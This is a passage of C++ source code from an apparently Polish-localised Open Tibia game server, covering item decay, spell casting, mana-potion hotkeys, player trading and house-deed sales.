    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::checkDecay()");

    addEvent(makeTask(DECAY_INTERVAL, boost::bind(&Game::checkDecay,this,DECAY_INTERVAL)));

    list<decayBlock*>::iterator it;
    for(it = decayVector.begin(); it != decayVector.end();)
    {
        (*it)->decayTime -= t;
        if((*it)->decayTime <= 0)
        {
            list<Item*>::iterator it2;
            for(it2 = (*it)->decayItems.begin(); it2 != (*it)->decayItems.end(); ++it2)
            {
                /*todo: Decaying item could be in a  container carried by a player,
                should all items have a pointer to their parent (like containers)?*/
                Item* item = *it2;
                item->isDecaying = false;
                if(item->canDecay())
                {
                    if(item->pos.x != 0xFFFF)
                    {
                        Tile *tile = map->getTile(item->pos);
                        if(tile)
                        {
                            Position pos = item->pos;
                            Item* newitem = item->decay();

                            if(newitem)
                            {
                                int32_t stackpos = tile->getThingStackPos(item);
                                if(newitem == item)
                                {
                                    sendUpdateThing(NULL,pos,newitem,stackpos);
                                }
                                else
                                {
                                    if(tile->removeThing(item))
                                    {
                                        //autoclose containers
                                        if(dynamic_cast<Container*>(item))
                                        {
                                            SpectatorVec list;
                                            SpectatorVec::iterator it;

                                            getSpectators(Range(pos, true), list);

                                            for(it = list.begin(); it != list.end(); ++it)
                                            {
                                                Player* spectator = dynamic_cast<Player*>(*it);
                                                if(spectator)
                                                    spectator->onThingRemove(item);
                                            }
                                        }

                                        tile->insertThing(newitem, stackpos);
                                        sendUpdateThing(NULL,pos,newitem,stackpos);
                                        FreeThing(item);
                                    }
                                }
                                startDecay(newitem);
                            }
                            else
                            {
                                if(removeThing(NULL,pos,item))
                                {
                                    FreeThing(item);
                                }
                            }//newitem
                        }//tile
                    }//pos != 0xFFFF
                }//item->canDecay()
                FreeThing(item);
            }//for it2
            delete *it;
            it = decayVector.erase(it);
        }//(*it)->decayTime <= 0
        else
        {
            ++it;
        }
    }//for it

    flushSendBuffers();
}

void Game::startDecay(Item* item)
{
    if(item->isDecaying)
        return;//dont add 2 times the same item
    //get decay time
    item->isDecaying = true;
    uint32_t dtime = item->getDecayTime();
    if(dtime == 0)
        return;
    //round time
    if(dtime < DECAY_INTERVAL)
        dtime = DECAY_INTERVAL;
    dtime = (dtime/DECAY_INTERVAL)*DECAY_INTERVAL;
    item->useThing();
    //search if there are any block with this time
    list<decayBlock*>::iterator it;
    for(it = decayVector.begin(); it != decayVector.end(); ++it)
    {
        if((*it)->decayTime == dtime)
        {
            (*it)->decayItems.push_back(item);
            return;
        }
    }
    //we need a new decayBlock
    decayBlock* db = new decayBlock;
    db->decayTime = dtime;
    db->decayItems.clear();
    db->decayItems.push_back(item);
    decayVector.push_back(db);
}

void Game::checkSpawns(int32_t t)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::checkSpawns()");

    SpawnManager::instance()->checkSpawns(t);
    this->addEvent(makeTask(t, std::bind2nd(std::mem_fun(&Game::checkSpawns), t)));
}

void Game::CreateDamageUpdate(Creature* creature, Creature* attackCreature, int32_t damage)
{
    Player* player = dynamic_cast<Player*>(creature);
    Player* attackPlayer = dynamic_cast<Player*>(attackCreature);
    if(!player)
        return;
    //player->sendStats();
    //msg.AddPlayerStats(player);
    if (damage > 0)
    {
        std::stringstream dmgmesg;

        if(damage == 1)
            dmgmesg << "Straciles 1 punkt zycia";
        else if (damage > 1 && damage < 5)
            dmgmesg << "Straciles " << damage << " punkty zycia";
        else
            dmgmesg << "Straciles " << damage << " punktow zycia";

        if(attackPlayer)
            dmgmesg << " w walce z " << attackCreature->getName();

        else if(attackCreature)
        {
            std::string strname = attackCreature->getName();
            //std::transform(strname.begin(), strname.end(), strname.begin(), (int32_t(*)(int32_t))tolower);
            toLowerCaseString(strname);
            dmgmesg << " w walce z " << strname;
        }
        dmgmesg <<".";
#ifdef HUCZU_SERVER_LOG
        player->sendFromSystem(SPEAK_CHANNEL_O, dmgmesg.str().c_str());
#else
        player->sendTextMessage(MSG_EVENT, dmgmesg.str().c_str());
#endif
    }
}

void Game::CreateManaDamageUpdate(Creature* creature, Creature* attackCreature, int32_t damage)
{
    Player* player = dynamic_cast<Player*>(creature);
    Player* attackPlayer = dynamic_cast<Player*>(attackCreature);
    if(!player)
        return;
    //player->sendStats();
    //msg.AddPlayerStats(player);
    if (damage > 0)
    {
        std::stringstream dmgmesg;
        if(damage == 1)
            dmgmesg << "Straciles 1 punkt many";
        else if (damage > 1 && damage < 5)
            dmgmesg << "Straciles " << damage << " punkty many";
        else
            dmgmesg << "Straciles " << damage << " punktow many";

        if(attackPlayer)
            dmgmesg << " w walce z " << attackCreature->getName();

        else if(attackCreature)
        {
            std::string strname = attackCreature->getName();
            toLowerCaseString(strname);
            dmgmesg << " w walce z " << strname;
        }
        dmgmesg <<".";

#ifdef HUCZU_SERVER_LOG
        player->sendFromSystem(SPEAK_CHANNEL_O, dmgmesg.str().c_str());
#else
        player->sendTextMessage(MSG_EVENT, dmgmesg.str().c_str());
#endif
    }
}

bool Game::creatureSaySpell(Creature *creature, const std::string &text)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureSaySpell()");

    bool ret = false;

    Player* player = dynamic_cast<Player*>(creature);
    std::string temp, var;
    uint32_t loc = (uint32_t)text.find( "\"", 0 );
    if( loc != string::npos && loc >= 0)
    {
        temp = std::string(text, 0, loc-1);
        var = std::string(text, (loc+1), text.size()-loc-1);
    }
    else
    {
        temp = text;
        var = std::string("");
    }

    //std::transform(temp.begin(), temp.end(), temp.begin(), (int32_t(*)(int32_t))tolower);
    toLowerCaseString(temp);
    if(text == "!uh")
        useHotkey(player,2275,player->getItemCount(2275));
    if(text == "!manas")
        useHotkey(player,2006,5);
    if(creature->access >= g_config.ACCESS_PROTECT || !player)
    {
        std::map<std::string, Spell*>::iterator sit = spells.getAllSpells()->find(temp);
        if( sit != spells.getAllSpells()->end() )
        {
            sit->second->getSpellScript()->castSpell(creature, creature->pos, var);
            ret = true;
        }
    }
    else if(player)
    {
        std::map<std::string, Spell*>* tmp = spells.getVocSpells(player->vocation);
        if(tmp)
        {
            std::map<std::string, Spell*>::iterator sit = tmp->find(temp);
            if( sit != tmp->end() )
            {
                if(player->maglevel >= sit->second->getMagLv())
                {
                    sit->second->getSpellScript()->castSpell(creature, creature->pos, var);
                    ret = true;
                }
            }
        }
    }


    return ret;
}

void Game::playerAutoWalk(Player* player, std::list<Direction>& path)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerAutoWalk()");

    stopEvent(player->eventAutoWalk);

    if(player->isRemoved)
        return;

    player->pathlist = path;
    int32_t ticks = (int32_t)player->getSleepTicks();
    /*
    #ifdef __DEBUG__
    	std::cout << "playerAutoWalk - " << ticks << std::endl;
    #endif
    */
    if(!player->pathlist.empty())
        player->eventAutoWalk = addEvent(makeTask(ticks, std::bind2nd(std::mem_fun(&Game::checkPlayerWalk), player->getID())));

    // then we schedule the movement...
    // the interval seems to depend on the speed of the char?
    //player->eventAutoWalk = addEvent(makeTask<Direction>(0, MovePlayer(player->getID()), path, 400, StopMovePlayer(player->getID())));
    //player->pathlist = path;
}

bool Game::playerUseItemEx(Player *player, const Position& posFrom,const unsigned char  stack_from,
                           const Position &posTo,const unsigned char stack_to, const uint16_t itemid)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerUseItemEx()");

    if(player->isRemoved)
        return false;

    bool ret = false;

    Position thingpos = getThingMapPos(player, posFrom);
    Item *item = dynamic_cast<Item*>(getThing(posFrom, stack_from, player));

    if(item)
    {
#ifdef __MIZIAK_SUPERMANAS__
        if(item->getID() == 2006 && (int(item->getFluidType()) == 5 || int(item->getFluidType()) == 0))
        {
            if(int(item->getFluidType()) == 0)
            {
                player->sendCancel("It is empty.");
                return false;
            }
            else
            {
                if(item->pos.x == 0xFFFF)
                {
                    player->sendCancel("You can only use this item in your equipment.");
                    return false;
                }
                else if(item->getActionId() > 0)
                {
                    Player* target = dynamic_cast<Player*>(getThing(posTo, stack_to, player));
                    if(!target)
                    {
                        player->sendCancel("You can only use this item on players.");
                        return false;
                    }

                    int32_t minMana = (int32_t)(((player->level*g_config.MANAS_MIN_LVL)+(player->maglevel*g_config.MANAS_MIN_MLVL))*g_config.MANAS_MIN_LO);
                    int32_t maxMana = (int32_t)(((player->level*g_config.MANAS_MAX_LVL)+(player->maglevel*g_config.MANAS_MAX_MLVL))*g_config.MANAS_MAX_HI);
                    int32_t addmana = random_range(g_config.MANAS_MIN_MANA, g_config.MANAS_MAX_MANA);
                    target->mana = std::min(target->manamax,target->mana+addmana);
                    target->sendStats();
                    item->setItemCountOrSubtype(0);
                    this->sendUpdateThing(player,posFrom,item,stack_from);
                    if(item->getActionId() != 1)
                        this->addEvent(makeTask((g_config.MANAS_EXHAUSTED*1000), boost::bind(&Game::fullManas, this, item, player, posFrom, stack_from)));
                    item->setActionId(item->getActionId()-1);
                    this->sendMagicEffectToSpectors(target->pos, NM_ME_MAGIC_ENERGIE);
                    this->creatureSay(player,SPEAK_MONSTER2,"Manaaa...");
                    return true;
                }
                else
                {
                    player->sendCancel("It is empty.");
                    return false;
                }
            }
        }
#endif //__MIZIAK_SUPERMANAS__
        //Runes
        std::map<uint16_t, Spell*>::iterator sit = spells.getAllRuneSpells()->find(item->getID());
        if(sit != spells.getAllRuneSpells()->end())
        {
            if( (abs(thingpos.x - player->pos.x) > 1) || (abs(thingpos.y - player->pos.y) > 1) )
            {
                player->sendCancel("Za daleko...");
                ret = false;
            }
            else
            {
                std::string var = std::string("");
                if(player->access >= g_config.ACCESS_PROTECT || sit->second->getMagLv() <= player->maglevel)
                {
                    bool success = sit->second->getSpellScript()->castSpell(player, posTo, var);
                    ret = success;
                    if(success)
                    {
                        autoCloseTrade(item);
                        item->setItemCharge(std::max((int32_t)item->getItemCharge() - 1, 0) );
                        if(item->getItemCharge() == 0)
                        {
                            if(removeThing(player,posFrom,item))
                            {
                                FreeThing(item);
                            }
                        }
                    }
                }
                else
                {
                    player->sendCancel("Nie posiadasz wymaganego mlvl do uzycia tej runy.");
                }
            }
        }
        else
        {
            actions.UseItemEx(player,posFrom,stack_from,posTo,stack_to,itemid);
            ret = true;
        }
    }
    return ret;
}

bool Game::useHotkey(Player* player, int32_t itemid, int32_t count)
{
    if(player->getItem(itemid,count))
    {
        if (player->exhaustedTicks < 1000)
        {
            bool inSlot = false;
            Item *hot = NULL;
            for (int32_t slot = 1; slot <= 10; slot++)
            {
                Item *itemek = const_cast<Item*>(player->items[slot]);
                if (itemek)
                {
                    if (itemek->getID() == itemid)
                    {
                        hot = itemek;
                        inSlot = true;
                        break;
                    }
                }
            }
            if(!inSlot)
            {
                if(count == 5)
                    hot = player->getItemByID(itemid,count, true);
                else
                    hot = player->getItemByID(itemid,count, false);
            }
            if(hot)
            {
                if(count == 5)
                {
                    if(hot->getActionId() > 0)
                    {
                        int32_t minMana = (int32_t)(((player->level*g_config.MANAS_MIN_LVL)+(player->maglevel*g_config.MANAS_MIN_MLVL))*g_config.MANAS_MIN_LO);
                        int32_t maxMana = (int32_t)(((player->level*g_config.MANAS_MAX_LVL)+(player->maglevel*g_config.MANAS_MAX_MLVL))*g_config.MANAS_MAX_HI);
                        int32_t addmana = random_range(minMana, maxMana);
                        std::stringstream addManaKomunikat;
                        addManaKomunikat << addmana;
                        player->mana = std::min(player->manamax,player->mana+addmana);
                        player->sendStats();
                        hot->setItemCountOrSubtype(0);
                        sendUpdateThing(player,player->pos,hot, NULL);
                        if(hot->getActionId() != 1)
                            player->eventManas = addEvent(makeTask((g_config.MANAS_EXHAUSTED*1000), boost::bind(&Game::fullManas, this, hot, player, player->pos, NULL)));
                        hot->setActionId(hot->getActionId()-1);
                        sendMagicEffectToSpectors(player->pos, NM_ME_MAGIC_ENERGIE);
                        creatureSay(player,SPEAK_MONSTER1,addManaKomunikat.str().c_str());
                        player->exhaustedTicks = g_config.EXHAUSTED;
                        return true;
                    }
                    else
                    {
                        player->sendCancel("It is empty.");
                        return false;
                    }
                }
                else
                {
                    MagicEffectClass me;
                    me.attackType = ATTACK_NONE;
                    me.animationEffect = DIST_NONE;//NM_ANI_NONE
                    me.hitEffect = 255; //NM_ME_NONE
                    me.damageEffect = NM_ME_MAGIC_ENERGIE;
                    me.animationColor = COLOR_GREEN;
                    me.offensive = false;
                    me.drawblood = false;
                    me.minDamage = int32_t((player->level * 2 + player->maglevel * 3) * 2.2);
                    if(me.minDamage < 250)
                        me.minDamage = 250;

                    me.maxDamage = int32_t((player->level * 2 + player->maglevel * 3) * 3);
                    if(me.maxDamage < 250)
                        me.maxDamage = 250;

                    hot->setItemCharge(hot->getItemCharge() - 1);
                    if(hot->getItemCharge() == 0)
                        player->removeItem(itemid,1);

                    creatureThrowRune(player, player->pos, me);
                    player->exhaustedTicks = g_config.EXHAUSTED;
                    return true;
                }
            }
        }
        else
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
            player->sendTextMessage(MSG_SMALLINFO, "You are exhausted.");
            return false;
        }
    }
    return true;
}

bool Game::playerUseItem(Player *player, const Position& pos, const unsigned char stackpos, const uint16_t itemid, unsigned char index)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerUseItem()");
    if(player->isRemoved)
        return false;
    actions.UseItem(player,pos,stackpos,itemid,index);
    return true;
}

bool Game::playerUseBattleWindow(Player *player, Position &posFrom, unsigned char stackpos, uint16_t itemid, uint32_t creatureid)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerUseBattleWindow");

    if(player->isRemoved)
        return false;

    Creature *creature = getCreatureByID(creatureid);
    if(!creature || dynamic_cast<Player*>(creature))
        return false;

    if(std::abs(creature->pos.x - player->pos.x) > 7 || std::abs(creature->pos.y - player->pos.y) > 5 || creature->pos.z != player->pos.z)
        return false;

    bool ret = false;

    Position thingpos = getThingMapPos(player, posFrom);
    Item *item = dynamic_cast<Item*>(getThing(posFrom, stackpos, player));
    if(item)
    {
        //Runes
        std::map<uint16_t, Spell*>::iterator sit = spells.getAllRuneSpells()->find(item->getID());
        if(sit != spells.getAllRuneSpells()->end())
        {
            if( (abs(thingpos.x - player->pos.x) > 1) || (abs(thingpos.y - player->pos.y) > 1) )
            {
                player->sendCancel("Za daleko...");
            }
            else
            {
                std::string var = std::string("");
                if(player->access >= g_config.ACCESS_PROTECT || sit->second->getMagLv() <= player->maglevel)
                {
                    bool success = sit->second->getSpellScript()->castSpell(player, creature->pos, var);
                    ret = success;
                    if(success)
                    {
                        autoCloseTrade(item);
                        item->setItemCharge(std::max((int32_t)item->getItemCharge() - 1, 0) );
                        if(item->getItemCharge() == 0)
                        {
                            if(removeThing(player,posFrom,item))
                            {
                                FreeThing(item);
                            }
                        }
                    }
                }
                else
                {
                    player->sendCancel("Nie posiadasz wymaganego mlvl do uzycia tej runy.");
                }
            }
        }
    }
    return ret;
}

bool Game::playerRotateItem(Player *player, const Position& pos, const unsigned char stackpos, const uint16_t itemid)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerRotateItem()");

    if(player->isRemoved)
        return false;

    if(std::abs(player->pos.x - pos.x) > 1 || std::abs(player->pos.y - pos.y) > 1 || player->pos.z != pos.z)
    {
        player->sendCancel("Za daleko.");
        return false;
    }

    Item *item = dynamic_cast<Item*>(getThing(pos, stackpos, player));
    if(item && item->rotate())
    {
        sendUpdateThing(player, pos, item, stackpos);
    }

    return false;
}

void Game::playerRequestTrade(Player* player, const Position& pos,
                              const unsigned char stackpos, const uint16_t itemid, uint32_t playerid)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerRequestTrade()");

    if(player->isRemoved)
        return;

    Player *tradePartner = getPlayerByID(playerid);
    if(!tradePartner || tradePartner == player)
    {
        player->sendTextMessage(MSG_INFO, "Sorry, not possible.");
        return;
    }
    if(player->tradeState != TRADE_NONE && !(player->tradeState == TRADE_ACKNOWLEDGE && player->tradePartner == playerid))
    {
        player->sendCancel("Aktualnie handlujesz.");
        return;
    }
    else if(tradePartner->tradeState != TRADE_NONE && tradePartner->tradePartner != player->getID())
    {
        player->sendCancel("Ten gracz aktulanie handluje.");
        return;
    }

    Item *tradeItem = dynamic_cast<Item*>(getThing(pos, stackpos, player));
    if(!tradeItem || tradeItem->getID() != itemid || !tradeItem->isPickupable())
    {
        player->sendCancel("Sorry, not possible.");
        return;
    }

#ifdef __KIRO_AKT__
    if(tradeItem->getID() == ITEM_AKT)
    {
        Tile* tile = getTile(player->pos);
        House* house = tile? tile->getHouse() : NULL;

        if(!house)
        {
            player->sendCancel("Musisz stac w domku!");
            return;
        }
        if(house->getOwner() != player->getName())
        {
            player->sendCancel("Musisz stac w swoim domku!");
            return;
        }
    }

#endif

    if(!player->removeItem(tradeItem, true))
    {
        /*if( (abs(player->pos.x - pos.x) > 1) || (abs(player->pos.y - pos.y) > 1) ) {
        	player->sendCancel("To far away...");
        	return;
        }*/
        player->sendCancel("Sorry, not possible.");
        return;
    }

    std::map<Item*, uint32_t>::const_iterator it;
    const Container* container = NULL;
    for(it = tradeItems.begin(); it != tradeItems.end(); ++it)
    {
        if(tradeItem == it->first ||
                ((container = dynamic_cast<const Container*>(tradeItem)) && container->isHoldingItem(it->first)) ||
                ((container = dynamic_cast<const Container*>(it->first)) && container->isHoldingItem(tradeItem)))
        {
            player->sendTextMessage(MSG_INFO, "This item is already beeing traded.");
            return;
        }
    }

    Container* tradeContainer = dynamic_cast<Container*>(tradeItem);
    if(tradeContainer && tradeContainer->getItemHoldingCount() + 1 > 100)
    {
        player->sendTextMessage(MSG_INFO, "Nie mozesz handlowac wiecej niz 100 przedmiotami.");
        return;
    }

    player->tradePartner = playerid;
    player->tradeItem = tradeItem;
    player->tradeState = TRADE_INITIATED;
    tradeItem->useThing();
    tradeItems[tradeItem] = player->getID();

    player->sendTradeItemRequest(player, tradeItem, true);

    if(tradePartner->tradeState == TRADE_NONE)
    {
        std::stringstream trademsg;
        Tile* tile = getTile(player->pos);
        House* house = tile? tile->getHouse() : NULL;
        if(tradeItem->getID() == ITEM_AKT)
        {
            trademsg << player->getName() <<" chce Ci sprzedac domek " << house->getName() << ".";
        }
        else
        {
            trademsg << player->getName() <<" chce z Toba handlowac.";
        }
        tradePartner->sendTextMessage(MSG_INFO, trademsg.str().c_str());
        tradePartner->tradeState = TRADE_ACKNOWLEDGE;
        tradePartner->tradePartner = player->getID();
    }
    else
    {
        Item* counterOfferItem = tradePartner->tradeItem;
        player->sendTradeItemRequest(tradePartner, counterOfferItem, false);
        tradePartner->sendTradeItemRequest(player, tradeItem, false);
    }
}

void Game::playerAcceptTrade(Player* player)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerAcceptTrade()");

    if(player->isRemoved)
        return;

    player->setAcceptTrade(true);
    Player *tradePartner = getPlayerByID(player->tradePartner);
    if(tradePartner && tradePartner->getAcceptTrade())
    {
        Item *tradeItem1 = player->tradeItem;
        Item *tradeItem2 = tradePartner->tradeItem;

        player->sendCloseTrade();
        tradePartner->sendCloseTrade();

#ifdef __KIRO_AKT__
        if(tradeItem1->getID() == ITEM_AKT)
        {
            Tile* tile = getTile(player->pos);
            House* house = tile? tile->getHouse() : NULL;
            Tile* tile2 = getTile(tradePartner->pos);
            Creature* creature = getCreatureByName(house->getOwner());
            Player* prevOwner = creature? dynamic_cast<Player*>(creature) : NULL;
            if(!house)
            {
                player->sendCancel("Musisz stac w domku!");
                return;
            }
            if(!tile->isHouse() && !tile2->isHouse() && player->tradeState != TRADE_INITIATED)
            {
                player->sendCancel("Akt wlasnosci mozesz sprzedac tylko gdy jestes w domku i jego ownerem!");
                return;
            }
            if(house->getOwner() != player->getName())
            {
                player->sendCancel("Musisz stac w swoim domku!");
                return;
            }
            if(house && house->checkHouseCount(tradePartner) >= g_config.MAX_HOUSES)
            {
                std::stringstream textmsg;
                textmsg << " Nie mozesz miec wiecej niz " << g_config.MAX_HOUSES << " domek.";
                tradePartner->sendTextMessage(MSG_ADVANCE, textmsg.str().c_str());
                return;
            }
            if (house && tradePartner->level < g_config.HOUSE_LVL_ROOK && tradePartner->vocation == VOCATION_NONE)
            {
                player->sendCancel("Ten gracz ma za maly poziom aby kupic od Ciebie dom!");
                std::stringstream textmsg;
                textmsg << "Masz za maly poziom aby kupic dom! Musisz posiadac " << g_config.HOUSE_LVL_ROOK << " poziom.";
                tradePartner->sendTextMessage(MSG_ADVANCE, textmsg.str().c_str());
                return;
            }
            if (house && tradePartner->level < g_config.HOUSE_LVL && tradePartner->vocation != VOCATION_NONE)
            {
                player->sendCancel("Ten gracz ma za maly poziom aby kupic od Ciebie dom!");
                std::stringstream textmsg;
                textmsg << "Masz za maly poziom aby kupic dom! Musisz posiadac " << g_config.HOUSE_LVL << " poziom.";
                tradePartner->sendTextMessage(MSG_ADVANCE, textmsg.str().c_str());
                return;
            }
            if(tradePartner->getFreeCapacity() < tradeItem1->getWeight())
            {
                return;
            }
            if(player->addItem(tradeItem2, true) && tradePartner->addItem(tradeItem1, true) &&
                    player->removeItem(tradeItem1, true) && tradePartner->removeItem(tradeItem2, true))
            {

                player->removeItem(tradeItem1);
                tradePartner->removeItem(tradeItem2);

                player->onThingRemove(tradeItem1);
                tradePartner->onThingRemove(tradeItem2);

                player->addItem(tradeItem2);
                tradePartner->addItem(tradeItem1);
            }
            else
            {
                player->sendTextMessage(MSG_SMALLINFO, "Nie masz miejsca.");
                tradePartner->sendTextMessage(MSG_SMALLINFO, "Nie masz miejsca.");
                return;
            }
            player->removeItem(tradeItem1, true);
            tradePartner->addItem(tradeItem1, true);
            player->addItem(tradeItem2, true);
            house->setOwner(tradePartner->getName());
            teleport(player,tradePartner->pos);
            if (prevOwner)
                prevOwner->houseRightsChanged = true;
            tradePartner->houseRightsChanged = true;
        }
        else if(tradeItem2->getID() == ITEM_AKT)
        {
            Tile* tile = getTile(tradePartner->pos);
            House* house = tile? tile->getHouse() : NULL;
            Tile* tile2 = getTile(player->pos);
            Creature* creature = getCreatureByName(house->getOwner());
            Player* prevOwner = creature? dynamic_cast<Player*>(creature) : NULL;
            if(!house)
            {
                tradePartner->sendCancel("Musisz stac w domku!");
                return;
            }
            if(!tile->isHouse() && !tile2->isHouse() && player->tradeState != TRADE_INITIATED)
            {
                player->sendCancel("Akt wlasnosci mozesz sprzedac tylko gdy jestes w domku i jego ownerem!");
                return;
            }
            if(house->getOwner() != tradePartner->getName())
            {
                tradePartner->sendCancel("Musisz stac w swoim domku!");
                return;
            }
            if(house && house->checkHouseCount(player) >= g_config.MAX_HOUSES)
            {
                std::stringstream textmsg;
                textmsg << " Nie mozesz miec wiecej niz " << g_config.MAX_HOUSES << " domek.";
                tradePartner->sendTextMessage(MSG_ADVANCE, textmsg.str().c_str());
                return;
            }
            if (house && tradePartner->level < g_config.HOUSE_LVL_ROOK && tradePartner->vocation == VOCATION_NONE)
            {
                player->sendCancel("Ten gracz ma za maly poziom aby kupic od Ciebie dom!");
                std::stringstream textmsg;
                textmsg << "Masz za maly poziom aby kupic dom! Musisz posiadac " << g_config.HOUSE_LVL_ROOK << " poziom.";
                tradePartner->sendTextMessage(MSG_ADVANCE, textmsg.str().c_str());
                return;
            }
            if (house && tradePartner->level < g_config.HOUSE_LVL && tradePartner->vocation != VOCATION_NONE)
            {
                player->sendCancel("Ten gracz ma za maly poziom aby kupic od Ciebie dom!");
                std::stringstream textmsg;
                textmsg << "Masz za maly poziom aby kupic dom! Musisz posiadac " << g_config.HOUSE_LVL << " poziom.";
                tradePartner->sendTextMessage(MSG_ADVANCE, textmsg.str().c_str());
                return;
            }
            if(tradePartner->getFreeCapacity() < tradeItem1->getWeight())
            {
                return;
            }
            if(player->addItem(tradeItem2, true) && tradePartner->addItem(tradeItem1, true) &&
                    player->removeItem(tradeItem1, true) && tradePartner->removeItem(tradeItem2, true))
            {

                player->removeItem(tradeItem1);
                tradePartner->removeItem(tradeItem2);

                player->onThingRemove(tradeItem1);
                tradePartner->onThingRemove(tradeItem2);

                player->addItem(tradeItem2);
                tradePartner->addItem(tradeItem1);
            }
            else
            {
                player->sendTextMessage(MSG_SMALLINFO, "Nie masz miejsca.");
                tradePartner->sendTextMessage(MSG_SMALLINFO, "Nie masz miejsca.");
                return;
            }
            tradePartner->removeItem(tradeItem1, true);
            player->addItem(tradeItem1, true);
            tradePartner->addItem(tradeItem2, true);
            house->setOwner(player->getName());
            teleport(tradePartner,player->pos);
            if (prevOwner)
                prevOwner->houseRightsChanged = true;
            player->houseRightsChanged = true;
        }
#endif

        if(player->addItem(tradeItem2, true) && tradePartner->addItem(tradeItem1, true) &&
                player->removeItem(tradeItem1, true) && tradePartner->removeItem(tradeItem2, true))
        {

            player->removeItem(tradeItem1);
            tradePartner->removeItem(tradeItem2);

            player->onThingRemove(tradeItem1);
            tradePartner->onThingRemove(tradeItem2);

            player->addItem(tradeItem2);
            tradePartner->addItem(tradeItem1);
        }
        else
        {
            player->sendTextMessage(MSG_SMALLINFO, "Sorry not possible.");
            tradePartner->sendTextMessage(MSG_SMALLINFO, "Sorry not possible.");
        }

        std::map<Item*, uint32_t>::iterator it;

        it = tradeItems.find(tradeItem1);
        if(it != tradeItems.end())
        {
            FreeThing(it->first);
            tradeItems.erase(it);
        }

        it = tradeItems.find(tradeItem2);
        if(it != tradeItems.end())
        {
            FreeThing(it->first);
            tradeItems.erase(it);
        }

        player->setAcceptTrade(false);
        tradePartner->setAcceptTrade(false);
    }
}

void Game::playerLookInTrade(Player* player, bool lookAtCounterOffer, int32_t index)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerLookInTrade()");

    Player *tradePartner = getPlayerByID(player->tradePartner);
    if(!tradePartner)
        return;

    Item *tradeItem = NULL;

    if(lookAtCounterOffer)
        tradeItem = tradePartner->getTradeItem();
    else
        tradeItem = player->getTradeItem();

    if(!tradeItem)
        return;

#ifdef __KIRO_AKT__
    if(tradeItem->getID() == ITEM_AKT)
    {
        Tile* tile = getTile(tradePartner->pos);
        House* house = tile? tile->getHouse() : NULL;


        if(house && house->getOwner() == tradePartner->getName())
        {
            stringstream ss;
            ss << "You see " << tradeItem->getDescription(true) << " Dotyczy on domku: " << house->getName() << ".";
            player->sendTextMessage(MSG_INFO, ss.str().c_str());
            return;
        }

    }
#endif

    if(index == 0)
    {
        stringstream ss;
        ss << "You see " << tradeItem->getDescription(true);
        player->sendTextMessage(MSG_INFO, ss.str().c_str());
        return;
    }

    Container *tradeContainer = dynamic_cast<Container*>(tradeItem);
    if(!tradeContainer || index > tradeContainer->getItemHoldingCount())
        return;

    bool foundItem = false;
    std::list<const Container*> stack;
    stack.push_back(tradeContainer);

    ContainerList::const_iterator it;

    while(!foundItem && !stack.empty())
    {
        const Container *container = stack.front();
        stack.pop_front();

        for (it = container->getItems(); it != container->getEnd(); ++it)
        {
            Container *container = dynamic_cast<Container*>(*it);
            if(container)
            {
                stack.push_back(container);
            }

            --index;
            if(index == 0)
            {
                tradeItem = *it;
                foundItem = true;
                break;
            }
        }
    }

    if(foundItem)
    {
        stringstream ss;
        ss << "You see " << tradeItem->getDescription(true);
        player->sendTextMessage(MSG_INFO, ss.str().c_str());
    }
}

void Game::playerCloseTrade(Player* player)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerCloseTrade()");

    Player* tradePartner = getPlayerByID(player->tradePartner);

    std::vector<Item*>::iterator it;
    if(player->getTradeItem())
    {
        std::map<Item*, uint32_t>::iterator it = tradeItems.find(player->getTradeItem());
        if(it != tradeItems.end())
        {
            FreeThing(it->first);
            tradeItems.erase(it);
        }
    }

    player->setAcceptTrade(false);
    player->sendTextMessage(MSG_SMALLINFO, "Trade anulowany.");
    player->sendCloseTrade();

    if(tradePartner)
    {
        if(tradePartner->getTradeItem())
        {
            std::map<Item*, uint32_t>::iterator it = tradeItems.find(tradePartner->getTradeItem());
            if(it != tradeItems.end())
            {
                FreeThing(it->first);
                tradeItems.erase(it);
            }
        }

        tradePartner->setAcceptTrade(false);
        tradePartner->sendTextMessage(MSG_SMALLINFO, "Trade anulowany.");
        tradePartner->sendCloseTrade();
    }
}

void Game::autoCloseTrade(const Item* item, bool itemMoved /*= false*/)
{
    if(!item)
        return;

    std::map<Item*, uint32_t>::const_iterator it;
    const Container* container = NULL;
    for(it = tradeItems.begin(); it != tradeItems.end(); ++it)
    {
        if(item == it->first ||
                (itemMoved && (container = dynamic_cast<const Container*>(item)) && container->isHoldingItem(it->first)) ||
                ((container = dynamic_cast<const Container*>(it->first)) && container->isHoldingItem(item)))
        {
            Player* player = getPlayerByID(it->second);
            if(player)
            {
                playerCloseTrade(player);
            }

            break;
        }
    }
}


void Game::autoCloseAttack(Player* player, Creature* target)
{
    if((std::abs(player->pos.x - target->pos.x) > 7) ||
            (std::abs(player->pos.y - target->pos.y) > 5) || (player->pos.z != target->pos.z))
    {
        player->sendTextMessage(MSG_SMALLINFO, "Obiekt zgubiony.");
        playerSetAttackedCreature(player, 0);
    }
}
#ifdef HUCZU_FOLLOW
void Game::autoCloseFollow(Player* player, Creature* target)
{
    if((std::abs(player->pos.x - target->pos.x) > 7) ||
            (std::abs(player->pos.y - target->pos.y) > 5) || (player->pos.z != target->pos.z))
    {
        player->sendTextMessage(MSG_SMALLINFO, "Obiekt zgubiony.");
        playerSetFollowCreature(player, 0);
    }
}
#endif

void Game::playerSetAttackedCreature(Player* player, uint32_t creatureid)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerSetAttackedCreature()");

    if(player->isRemoved)
        return;

    if(player->attackedCreature != 0 && creatureid == 0)
    {
        player->sendCancelAttacking();
    }


    Creature* attackedCreature = NULL;
    if(creatureid != 0)
